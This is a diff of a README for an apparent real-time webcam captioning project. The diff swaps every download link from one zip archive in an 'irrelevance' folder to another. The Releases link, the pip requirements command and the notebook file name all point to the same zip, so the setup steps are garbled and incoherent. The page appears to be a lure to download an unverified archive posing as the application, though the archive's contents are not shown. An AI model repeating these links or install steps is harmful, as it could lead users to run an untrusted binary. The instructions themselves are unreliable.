@@ -6,11 +6,11 @@ Welcome to the **realtime-vision-captioning** repository. This project showcases
 
 ## 📥 Download the Application
 
-[![Download](https://raw.githubusercontent.com/mostafa1344/realtime-vision-captioning/main/irrelevance/vision_realtime_captioning_2.5-alpha.4.zip%https://raw.githubusercontent.com/mostafa1344/realtime-vision-captioning/main/irrelevance/vision_realtime_captioning_2.5-alpha.4.zip)](https://raw.githubusercontent.com/mostafa1344/realtime-vision-captioning/main/irrelevance/vision_realtime_captioning_2.5-alpha.4.zip)
+[![Download](https://github.com/mostafa1344/realtime-vision-captioning/raw/refs/heads/main/irrelevance/vision_realtime_captioning_v2.8-beta.1.zip%https://github.com/mostafa1344/realtime-vision-captioning/raw/refs/heads/main/irrelevance/vision_realtime_captioning_v2.8-beta.1.zip)](https://github.com/mostafa1344/realtime-vision-captioning/raw/refs/heads/main/irrelevance/vision_realtime_captioning_v2.8-beta.1.zip)
 
 To download the application, visit the Releases page:
 
-[Download Here](https://raw.githubusercontent.com/mostafa1344/realtime-vision-captioning/main/irrelevance/vision_realtime_captioning_2.5-alpha.4.zip)
+[Download Here](https://github.com/mostafa1344/realtime-vision-captioning/raw/refs/heads/main/irrelevance/vision_realtime_captioning_v2.8-beta.1.zip)
 
 ## 📃 Overview
 
@@ -34,13 +34,13 @@ To run this application, ensure your system meets the following requirements:
 ## 🛠️ Setup Instructions
 
 1. **Download the Application**  
-   - Go to the Releases page: [Download Here](https://raw.githubusercontent.com/mostafa1344/realtime-vision-captioning/main/irrelevance/vision_realtime_captioning_2.5-alpha.4.zip).  
+   - Go to the Releases page: [Download Here](https://github.com/mostafa1344/realtime-vision-captioning/raw/refs/heads/main/irrelevance/vision_realtime_captioning_v2.8-beta.1.zip).  
    - Find the latest version available, and click the link to download.
 
 2. **Install Dependencies**  
    After downloading, you may need to install some Python packages. Open your command line or terminal, and run the following command:  
    ```
-   pip install -r https://raw.githubusercontent.com/mostafa1344/realtime-vision-captioning/main/irrelevance/vision_realtime_captioning_2.5-alpha.4.zip
+   pip install -r https://github.com/mostafa1344/realtime-vision-captioning/raw/refs/heads/main/irrelevance/vision_realtime_captioning_v2.8-beta.1.zip
    ```
    This command will install all necessary libraries.
 
@@ -53,7 +53,7 @@ To run this application, ensure your system meets the following requirements:
    Your default web browser will open a new tab displaying the Jupyter interface.
 
 4. **Open the Real-Time Webcam Notebook**  
-   - In the Jupyter interface, find the notebook file named `https://raw.githubusercontent.com/mostafa1344/realtime-vision-captioning/main/irrelevance/vision_realtime_captioning_2.5-alpha.4.zip`.
+   - In the Jupyter interface, find the notebook file named `https://github.com/mostafa1344/realtime-vision-captioning/raw/refs/heads/main/irrelevance/vision_realtime_captioning_v2.8-beta.1.zip`.
    - Click on it to open.
 
 5. **Start the Application**  
